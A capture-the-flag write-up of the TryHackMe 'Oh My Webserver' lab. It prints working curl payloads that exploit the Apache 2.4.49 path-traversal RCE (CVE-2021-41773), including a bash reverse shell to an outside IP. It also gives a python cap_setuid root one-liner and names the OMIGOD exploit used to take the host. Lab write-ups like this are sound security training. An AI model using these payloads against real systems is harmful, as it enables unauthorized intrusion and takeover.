# Oh My Webserver

***

Platform: Tryhackme

Difficulty: Medium

Initial Access: Outdated apache web server

Privilege Escalation: Misconfigured capabilities(container) and CVE-2021-38647(hostmachine)

***

Nmap scan:

```bash
┌──(ghost㉿kali)-[~/tryhackme/ohmywebserver]
└─$ sudo nmap -Pn -A -p- --min-rate 4000 10.10.25.254 -oN nmap.full
[sudo] password for ghost: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-10 00:34 EDT
Nmap scan report for 10.10.25.254
Host is up (0.27s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e0:d1:88:76:2a:93:79:d3:91:04:6d:25:16:0e:56:d4 (RSA)
|   256 91:18:5c:2c:5e:f8:99:3c:9a:1f:04:24:30:0e:aa:9b (ECDSA)
|_  256 d1:63:2a:36:dd:94:cf:3c:57:3e:8a:e8:85:00:ca:f6 (ED25519)
80/tcp open  http    Apache httpd 2.4.49 ((Unix))
|_http-title: Consult - Business Consultancy Agency Template | Home
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.49 (Unix)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone
Running (JUST GUESSING): Linux 4.X|2.6.X|3.X|5.X (97%), Google Android 10.X (91%)
OS CPE: cpe:/o:linux:linux_kernel:4.15 cpe:/o:google:android:10 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:5
Aggressive OS guesses: Linux 4.15 (97%), Android 9 - 10 (Linux 4.9 - 4.14) (91%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 4.15 - 5.19 (91%), Linux 2.6.32 - 3.10 (91%), Linux 5.4 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

| Ports     | Methodology                                                                                               |
| --------- | --------------------------------------------------------------------------------------------------------- |
| 22 (SSH)  | Potentially for later use                                                                                 |
| 80 (http) | Apache service version 2.4.49 looks outdated. May be potential exploit availabe for this service version. |

***

### Getting User Flag

Port 80:

Just a static website of business consultancy.

<figure><img src="https://github.com/user-attachments/assets/0c68c143-df78-46ed-93cf-1b8a28cf1757" alt=""><figcaption></figcaption></figure>

We can search for potential exploit which may be available on google for apache service version 2.4.49

<figure><img src="https://github.com/user-attachments/assets/4b2923d3-f4d9-4c57-8be4-1ea9d08e717f" alt=""><figcaption></figcaption></figure>

Confirmed, this service version is vulnerable to CVE-2021-41773.

💡

Apache 2.4.49 had a bug in how it normalized paths when processing HTTP requests.

This allowed attackers to **bypass access restrictions** and read files outside of the intended web root. The `mod_cgi` or `mod_cgid` module must be enabled **if** you want to escalate to remote code execution.

We can confirm `cgi-bin` directory though our browser.

<figure><img src="https://github.com/user-attachments/assets/f2555201-6842-4bf6-8888-eb6e57b11e40" alt=""><figcaption></figcaption></figure>

Forbidden, means its present, but we can’t access it.

Through the understanding of above CVE, we can use this payload to check if it works.

```bash
┌──(ghost㉿kali)-[~/tryhackme/ohmywebserver]
└─$ curl 'http://10.10.92.95/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/bash' -d 'echo Content-Type: text/plain; echo; whoami && pwd && id' -H "Content-Type: text/plain"
```

<figure><img src="https://github.com/user-attachments/assets/effb1afe-f646-43d7-b355-d6dd6dff86e8" alt=""><figcaption></figcaption></figure>

Ok, as it is executing our commands, let’s get the reverse shell back to us.

```bash
┌──(ghost㉿kali)-[~/tryhackme/ohmywebserver]
└─$ curl 'http://10.10.92.95/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/bash' -d 'echo Content-Type: text/plain; echo; whoami; bash; /bin/bash -i >& /dev/tcp/10.17.87.131/4445 0>&1' -H "Content-Type: text/plain"
```

<figure><img src="https://github.com/user-attachments/assets/7710b799-ecfd-4d55-8a33-286bef6a457e" alt=""><figcaption></figcaption></figure>

Got the reverse shell back as user daemon, but it’s a container, not a host machine….

<figure><img src="https://github.com/user-attachments/assets/ee832891-16fc-4582-8ba7-26e1f3e93fea" alt=""><figcaption></figcaption></figure>

After a lot of enumeration, I found something interesting by exploring capabilities.

<figure><img src="https://github.com/user-attachments/assets/e52eb153-2e58-4649-ad9f-cccb2024c238" alt=""><figcaption></figcaption></figure>

python3.7 binary is set for cap\_setuid+ep capability, we can use it to gain root access.

> If you wanna read and know more about capabilities you can check [article by hackingarticles](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/) on privilege escalation via capabilities.

```bash
daemon@4a70924bafa0:/tmp$ /usr/bin/python3.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

<figure><img src="https://github.com/user-attachments/assets/b8f1c678-adf1-44e8-bfd2-be5d9b21a02c" alt=""><figcaption></figcaption></figure>

Got root shell on that container.

Grabbed user flag.

<figure><img src="https://github.com/user-attachments/assets/42d0a280-b55a-4f34-bce2-861861abe74a" alt=""><figcaption></figcaption></figure>

***

### Getting Root flag

Checked container’s ip address

<figure><img src="https://github.com/user-attachments/assets/d0e41ed9-3221-46ee-abec-ae60291a81ca" alt=""><figcaption></figcaption></figure>

As this container is running on ip `172.17.0.2` , host machine should be running on `172.17.0.1`

We can transfer [nmap binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) on container and use it to scan open ports on hostmachine.

Download that binary on your kali machine, then transfer it to the container which we owned.

<figure><img src="https://github.com/user-attachments/assets/32c9ef32-0ffa-4de9-90eb-09a7490d3965" alt=""><figcaption></figcaption></figure>

<figure><img src="https://github.com/user-attachments/assets/54f2e66e-0d09-40ac-867e-bd5c948420bc" alt=""><figcaption></figcaption></figure>

Run that nmap binary.

<figure><img src="https://github.com/user-attachments/assets/49a42188-0055-4433-ba63-51a90bcf26c3" alt=""><figcaption></figcaption></figure>

As we can see, 4 ports were open on hostmachine `22, 80, 5985, 5986`

While searching for potential service exploit for 5986, found out a POC for CVE-2021-38647 #OMIGOD.

<figure><img src="https://github.com/user-attachments/assets/c5d22fba-ae5c-405a-88ed-f42bcc72f9ff" alt=""><figcaption></figcaption></figure>

Downloaded that python exploit in to kali machine and served it to the container.

<figure><img src="https://github.com/user-attachments/assets/83581f6c-d24b-486e-99a1-59d3d0555814" alt=""><figcaption></figcaption></figure>

<figure><img src="https://github.com/user-attachments/assets/8ddc8b92-8672-4917-9c8e-e632ffe534be" alt=""><figcaption></figcaption></figure>

Run that exploit.

<figure><img src="https://github.com/user-attachments/assets/bfcfb05b-8382-4cbf-aa82-53ebc1676594" alt=""><figcaption></figcaption></figure>

And, successfully able to execute commands to the hostmachine.

Let’s grab root’s flag.

<figure><img src="https://github.com/user-attachments/assets/b3d16fe8-ce8e-488e-ad86-a83865ef3291" alt=""><figcaption></figcaption></figure>

***

That’s it for this machine.✅
